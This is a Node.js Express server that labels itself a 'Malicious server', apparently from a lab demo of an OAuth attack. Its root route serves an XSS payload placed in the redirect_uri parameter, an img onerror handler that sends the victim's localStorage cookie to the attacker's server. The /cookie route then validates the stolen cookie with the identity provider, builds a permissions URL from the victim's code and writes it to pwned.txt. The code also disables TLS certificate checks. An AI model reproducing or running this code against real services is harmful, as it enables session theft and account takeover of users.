const fetch = require('node-fetch')
const express = require('express');
const app = express();
const fs = require('fs');
const https = require('https');
const path = require('path'); 
const privateKey  = fs.readFileSync(path.join(__dirname, 'certs/hack.key'), 'utf8');
const certificate = fs.readFileSync(path.join(__dirname, 'certs/hack.pem'), 'utf8');
const credentials = {key: privateKey, cert: certificate};

app.use(express.json());
app.use(require('sanitize').middleware);;
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// ENVIRONMENT VARS
if (process.env.DEV_ENV == undefined) {
    require('dotenv').config();
}

// NOTE: TLS is only used here to encrypt traffic.
// official certs cannot be verified. Therefore, this 
// demo will trust all certs as long as they are provided.
// So cert attacks will not be allowed.
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';

const DEV_ENV = process.env.DEV_ENV;
const COOKIE_NAME = process.env.COOKIE_NAME;
const VICTIM_ID = process.env.VICTIM_ID;

let port = 80;
let provPort = 80;
let appPort = 80;
let appURI = "https://10.21.19.2";
let serverURI = "https://10.21.19.4";
let providerURI = "https://10.21.19.1";
if (DEV_ENV == "true") {
    port = 4000;
    provPort = 3000;
    appPort = 8081;
    appURI = "https://localhost";
    serverURI = "https://localhost";
    providerURI = "https://localhost";
}

function getPermissions(userID, code) {
    let uri = new URL(`${providerURI}:${provPort}/permissions`)
    uri.search = new URLSearchParams({
        response_code: "code",
        scope: "openid profile",
        client_id: VICTIM_ID,
        redirect_uri: `${appURI}:${appPort}/account`,
        code: code,
        userID: userID
    }).toString();
    fs.writeFileSync(path.join(__dirname, 'pwned.txt'), uri.toString() + "\n")
    console.log("Finished writing to file!")
    console.log(uri.toString())
}

app.get('/cookie', (req, res) => {
    res.json({})
    const cookie = req.query.cookie
    if (cookie !== undefined) {
        let uri = new URL(`${providerURI}:${provPort}/validatecookie`)
        uri.search = new URLSearchParams({
            cookie: cookie
        }).toString();
        fetch(uri, {method: 'POST'})
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                console.log("Cookie data valid!")
                getPermissions(data.userID, data.code)
            }
        })
        .catch(e => {
            console.log(e)
        })
    }
})
app.get("/", (req, res) => {
    res.render("index", {
        PAYLOAD: `${providerURI}:${provPort}/authenticate?response_code=code&scope=openid profile&client_id=${VICTIM_ID}&redirect_uri=<img src onerror="fetch('${serverURI}:${port}/cookie?cookie='.concat(window.localStorage.guitarCookie)).then(a=>location.assign('${appURI}:${appPort}')).catch(e=>location.assign('${appURI}:${appPort}'));">`,
        COOKIE_NAME: COOKIE_NAME,
        PAYLOAD_ROUTE: `${serverURI}:${port}/cookie`
    })
})

const httpsServer = https.createServer(credentials, app);

httpsServer.listen(port, () => {
    console.log(`"Malicious server running at "${serverURI}:${port}`)
})
